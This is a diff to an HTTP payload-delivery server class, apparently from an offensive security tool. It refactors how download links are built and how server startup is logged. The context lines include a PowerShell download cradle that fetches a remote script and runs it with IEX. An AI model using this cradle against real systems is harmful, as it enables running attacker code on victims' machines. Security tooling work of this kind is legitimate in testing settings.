@@ -156,9 +156,11 @@ class HttpServer(Thread):
         http_route = self.create_download_link(route)
         return f"""(new-object System.Net.Webclient).downloadstring("{http_route}")|IEX"""
 
-    def create_download_link(self, route):
+    @classmethod
+    def create_download_link(cls, route):
         ip_addr = AppConfig.get("default_ip_address")
-        return f'http://{ip_addr}:{str(self.port)}/{route}'
+        port = AppConfig.get("port", "HttpServer")
+        return f'http://{ip_addr}:{port}/{route}'
 
     def end_download(self, route):
         HttpDeliveringServer.remove_file(route)
@@ -178,14 +180,14 @@ class HttpServer(Thread):
         try:
             httpd = HTTPServer((self.host, self.port), HttpDeliveringServer)
             self.server_status = ServerStatus.Running
+            Printer.log(f"Http server started on port {self.port}")
 
         except Exception as e:
-            self.has_started.set()
+            self.server_status = ServerStatus.Stopped
             Printer.err(e)
-            return
 
-        Printer.dbg(f"Http server started on port {self.port}")
-        self.has_started.set()
-        
+        finally:
+            self.has_started.set()
+
         while(self.server_status == ServerStatus.Running):
             httpd.handle_request()
